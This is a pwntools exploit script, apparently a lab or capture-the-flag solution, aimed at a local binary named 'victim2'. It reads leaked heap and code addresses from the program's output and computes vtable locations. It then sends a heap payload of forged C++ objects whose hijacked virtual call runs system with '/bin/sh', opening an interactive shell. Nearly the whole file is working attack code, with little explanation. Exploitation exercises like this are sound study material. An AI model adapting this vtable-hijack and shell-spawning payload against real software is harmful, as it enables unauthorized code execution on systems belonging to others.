from pwn import *


gdb_code_base      = 0x555555554000
gdb_leak           = 0x555555555334
gdb_course_vtable  = 0x555555557d40
gdb_button_vtable  = 0x555555557ce0
gdb_string_vtable  = 0x555555557d00
gdb_exam_vtable    = 0x555555557d20
gdb_studen_vtable  = 0x555555557d58

def calculs(leak):
    code_base = leak - (gdb_leak - gdb_code_base)
    course_vtable = code_base + (gdb_course_vtable - gdb_code_base)
    button_vtable = code_base + (gdb_button_vtable - gdb_code_base)
    string_vtable = code_base + (gdb_string_vtable - gdb_code_base)
    exam_vtable = code_base + (gdb_exam_vtable - gdb_code_base)
    studentable = code_base + (gdb_studen_vtable - gdb_code_base)
    return [course_vtable, button_vtable, string_vtable, exam_vtable, studentable]


gdb_libc_base      = 0x7f40a7e1e000
gdb_puts           = 0x7f40a7e93b00
gdb_system         = 0x7f40a7e6a920
gdb_binsh          = 0x7f40a7fb404f
puts_to_sys        = 0x10000000000000000 + gdb_system - gdb_puts
puts_to_sh         = gdb_binsh  - gdb_puts
#print(p64(puts_to_sys))
io = process("./victim2")

wait = input("wait")

io.recvuntil(b"Course at ")
leak_heap = int(io.recvuntil(b" ")[:-1], 16)
io.recvuntil(b"startng at ")
leak_code = int(io.recvuntil(b" ")[:-1], 16)
tab = calculs(leak_code)

leak_heap += 0x00

payload = b""
payload += b"\x55"*0xb0
payload += p64(tab[0] + 0x20)
payload += p64(leak_heap+0x20)  # endroit ou on met notre table de student #0x8
payload += p64(3)                                                          #0x10
payload += p64(0)
payload += p64(leak_heap+0x40)                                             #0x20
payload += p64(leak_heap+0x60)
payload += p64(leak_heap+0x80)                                             #0x30
payload += p64(0)
payload += p64(tab[2] + 0x20)          # string object                            #0x40
payload += p64(leak_heap+0x68)
payload += p64(8)                                                          #0x50
payload += p64(0)
payload += p64(tab[3] + 0x18)          #examobject                                #0x60
payload += p64(0)               # ce qui va recevoir le leak        
payload += p64(puts_to_sh)                                                        #0x70
payload += p64(puts_to_sys)
payload += p64(tab[1] + 0x20)          #button object                             #0x80
payload += p64(0)
payload += p64(0)
payload += b"\x00"*0x60



# for i in range(len(tab)):
#     print(hex(tab[i]))

io.sendafter(b"loop after\n", payload + b"\n")
#print(hex(leak_heap))
io.interactive()